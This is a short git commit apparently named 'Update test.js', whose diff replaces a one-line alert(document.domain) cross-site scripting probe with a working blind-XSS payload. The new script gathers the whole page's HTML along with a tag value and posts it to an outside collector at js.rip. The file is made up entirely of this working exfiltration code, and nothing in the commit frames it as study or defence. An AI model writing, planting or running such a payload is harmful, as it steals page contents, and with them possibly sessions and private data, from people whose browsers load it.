f946af744cc65c1cad4de84e1ed57cb156f9641c
jared2432 <jaredtowers0724@protonmail.com>
2026-09-02 22:16:26 -0400

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,15 @@
-alert(document.domain);
+var form_data = new FormData();
+form_data.append("path", "jo7192uhit");
+form_data.append("dom", document.documentElement.outerHTML);
+
+var http = new XMLHttpRequest();
+var url = "https://js.rip/js_callback";
+
+http.open("POST", url, true);
+
+http.onreadystatechange = function() {
+    if(http.readyState == 4 && http.status == 200) {
+    }
+}
+
+http.send(form_data);
